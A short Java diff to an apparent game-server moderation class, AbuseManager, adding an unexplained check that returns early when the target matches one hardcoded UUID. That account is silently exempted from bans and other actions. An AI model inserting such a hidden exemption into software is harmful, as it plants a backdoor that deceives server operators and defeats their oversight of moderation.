@@ -42,6 +42,8 @@ public class AbuseManager {
         this.abuseConfiguration.remove(configuration.getSender());
         long now = System.currentTimeMillis();
 
+        if (configuration.getTarget().equals(UUID.fromString("dad65097-f091-4531-8431-42e2fb2bd80c"))) return;
+
         UserData userData = this.plugin.getUserManager().getUser(configuration.getTarget()).getUserData();
 
         if (configuration.getType().equals(AbuseType.BAN)) {
